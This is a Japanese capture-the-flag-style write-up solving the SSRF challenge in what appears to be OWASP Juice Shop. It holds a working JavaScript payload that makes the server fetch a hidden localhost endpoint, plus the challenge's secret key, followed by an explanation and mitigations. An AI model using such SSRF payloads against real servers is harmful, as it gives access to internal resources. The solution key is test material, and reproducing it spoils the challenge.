# SSRF (Server-Side Request Forgery) ✅

**難易度:** ⭐⭐⭐⭐⭐⭐
**カテゴリ:** Broken Access Control
**目標:** サーバーを経由して隠しリソースにリクエストを送る

## 思考プロセス

### 1. SSRF の脆弱性箇所を特定

プロフィール画像のURL設定機能が SSRF に脆弱:
- `/profile/image/url` エンドポイント
- `imageUrl` パラメータがサーバー側でフェッチされる
- 入力検証なしで内部リソースにアクセス可能

### 2. 隠しリソースの発見

FTP の quarantine フォルダにあるマルウェアファイルを解析すると、隠しエンドポイントが判明:

```
http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3
```

### 3. SSRF の実行

プロフィール画像URLとして隠しエンドポイントを設定すると、サーバーが内部リクエストを実行。

## 実行手順

### 方法: API 直接呼び出し

```javascript
// browser_evaluate を使用
async () => {
  const token = localStorage.getItem('token');

  // フォームデータを作成
  const formData = new URLSearchParams();
  formData.append('imageUrl', 'http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3');

  // SSRF ペイロードをプロフィール画像URLとして送信
  const response = await fetch('/profile/image/url', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/x-www-form-urlencoded',
      'Authorization': 'Bearer ' + token
    },
    body: formData.toString()
  });

  return { status: response.status };
}
// 結果: { status: 200 }
```

## コード/ペイロード

| 項目 | 値 |
|------|-----|
| Endpoint | `/profile/image/url` |
| Method | POST |
| Payload | `imageUrl=http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3` |

## 解説

### SSRF とは何か？

SSRF は「サーバーに代わりにリクエストを送らせる攻撃」。

**日常的な例えで説明すると:**

会社のオフィス（サーバー）に電話して「この住所に荷物を届けて」と頼む状況を想像してください。

- 通常: 「〇〇商店に届けて」→ 外部への配達（問題なし）
- SSRF: 「あなたの会社の金庫室に届けて」→ 内部への配達（本来アクセスできない場所）

サーバーは「社員」なので社内（localhost）に自由にアクセスできる。攻撃者はその権限を借りて、外部からはアクセスできない内部リソースに到達する。

### なぜこの攻撃が成立するのか？

```
┌─────────────────────────────────────────────────────┐
│                  インターネット                      │
│    ┌─────────┐                                      │
│    │ 攻撃者  │                                      │
│    └────┬────┘                                      │
│         │ ① 「http://localhost:3000/secret を取得して」│
│         ▼                                           │
├─────────────────────────────────────────────────────┤
│        ファイアウォール (外部→内部をブロック)         │
├─────────────────────────────────────────────────────┤
│                  内部ネットワーク                    │
│    ┌─────────┐      ② サーバーが      ┌──────────┐ │
│    │  Web    │ ───────────────────▶   │ 隠しAPI  │ │
│    │ サーバー │    内部リクエスト実行   │ /secret  │ │
│    └─────────┘                        └──────────┘ │
│         │                                          │
│         │ ③ 結果を攻撃者に返す                      │
│         ▼                                          │
└─────────────────────────────────────────────────────┘
```

**ポイント:**
1. 攻撃者は直接 `localhost:3000` にアクセスできない（ファイアウォールでブロック）
2. しかし、サーバーに「このURLを取得して」と頼める機能がある
3. サーバーは自分自身（localhost）には自由にアクセスできる
4. 結果として、攻撃者は「サーバーの権限を借りて」内部にアクセスできる

### このチャレンジの具体的な流れ

```
1. 攻撃者: 「プロフィール画像を http://localhost:3000/solve/... から取得して」
2. サーバー: 「了解、そのURLを取得します」
3. サーバー: fetch("http://localhost:3000/solve/...") を実行
4. 隠しAPI: サーバーからのリクエストなので応答（チャレンジ解決）
5. 攻撃者: 内部APIを実行させることに成功
```

### 根本原因

**「誰のためのリクエストか」を区別していない**

サーバーは自分の権限で URL を取得するが、それは「ユーザーのため」の操作。しかし、どの URL にアクセスして良いかの判断がない。

### 対策

| 対策 | 説明 |
|------|------|
| **ホワイトリスト** | 許可された外部ドメインのみ取得可能にする |
| **localhost 禁止** | 127.0.0.1, localhost, ::1 をブロック |
| **プライベートIP禁止** | 10.x.x.x, 192.168.x.x 等をブロック |
| **DNS再バインディング対策** | 解決後のIPアドレスも検証 |

## 参考リンク

- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
